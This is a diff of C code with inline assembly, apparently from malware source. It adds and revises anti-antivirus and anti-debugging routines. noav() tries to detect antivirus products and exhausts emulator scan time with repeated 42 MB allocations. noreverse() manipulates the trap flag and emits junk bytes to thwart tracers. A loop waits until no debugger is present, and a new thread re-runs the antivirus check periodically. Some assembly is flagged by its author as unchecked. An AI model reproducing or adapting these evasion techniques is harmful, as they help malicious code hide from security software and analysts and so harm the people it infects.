@@ -241,8 +241,10 @@ int check_time_warp(void)
 		PUSH EAX;
 		XOR EAX, EAX;
 		JZ J;
-		MOV EAX, DWORD PTR ES : [0x04];
-		__asm __emit(0x3F);
+		INC EDX;
+		INC EDX;
+		INC EDX;
+		INC EDX;
 	J:	POP EAX;
 	}
 
@@ -274,7 +276,7 @@ BOOL CheckIfOneCPU(void)
 /// <summary>
 /// This function try to detect some AV that can detect me
 /// </summary>
-void noav(void)
+BOOL noav(BOOL InThread = TRUE)
 {
 	WORD ExitCode = 0;
 
@@ -297,7 +299,7 @@ void noav(void)
 	/* 	This method also exploits the time deadline on each AV scan, we simply allocate
 	nearly 42 Mb of memory then we will fill it with some bytes, at the end we will
 	free it.*/
-	for (int i = 0; i < ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING; i+=6) {
+	for (int i = 0; i < ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING; i += 6) {
 		// Allocate a zone of 42Mb of memory, fill it with zero and free it
 		char *MemoryToBeZeroized = NULL;
 		MemoryToBeZeroized = (char *)malloc(ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte); // two time of Answer to the Ultimate Question of Life, the Universe, and Everything
@@ -306,17 +308,22 @@ void noav(void)
 			free(MemoryToBeZeroized);
 		}
 	}
+
+
 	// Examine all process name
 	//TODO
 
-	if (ExitCode != 0)
+	if ((ExitCode != 0) && (InThread == FALSE))
 	{
 		DEBUGMSG("NOAV exit and detect a problem, its suspect...");
 		exit(ExitCode);
 	}
+	else {
+		return ExitCode;
+	}
 }
 
-BOOL WINAPI LoopUntilNotDebugged(void)
+void LoopUntilNotDebugged(void)
 {
 	__asm {
 	CheckDebugger:
@@ -326,7 +333,6 @@ BOOL WINAPI LoopUntilNotDebugged(void)
 			PUSH EAX;
 			XOR EAX, EAX;
 			JZ J;
-			MOV EAX, DWORD PTR FS : [0x04];
 			__asm __emit(0xEA);
 		J:	POP EAX;
 		}
@@ -339,8 +345,47 @@ BOOL WINAPI LoopUntilNotDebugged(void)
 
 void noreverse(void)
 {
+	// Change Trap Flag
+	/* The trap flag is used for tracing the program. If this flag is set every instruction
+	will raise “SINGLE_STEP” exception. Trap flag can be manipulated in order thwart
+	tracers.*/
+
+	// TODO : check better the code generated !!!
 	__asm {
-		PUSH EAX;
+		PUSHF;
+		PUSHF;
+		PUSH AX;
+		MOV AX, [ESP + 2];
+		AND AX, 0x0100;
+		MOV[ESP], AX;
 		POP EAX;
+		__emit(0xEB);
+		__emit(0x02); // JMP short loc_1;
+		__emit(0xE8);
+		__emit(0xCC);
+	loc_1:
+		POPF;
+		POPF;
+	}
+	LoopUntilNotDebugged();
+}
+
+DWORD WINAPI NoAVThread(LPVOID param)
+{
+	while (TRUE)
+	{
+		noav(TRUE);
+		Sleep(12345);
 	}
 }
+void StartNoAVThread(void)
+{
+	HANDLE NOAV_Thread;
+	NOAV_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NoAVThread, NULL, 0, NULL);
+	if (NOAV_Thread == NULL)
+	{
+		// Exit or not Exit ?
+		return;
+	}
+}
+
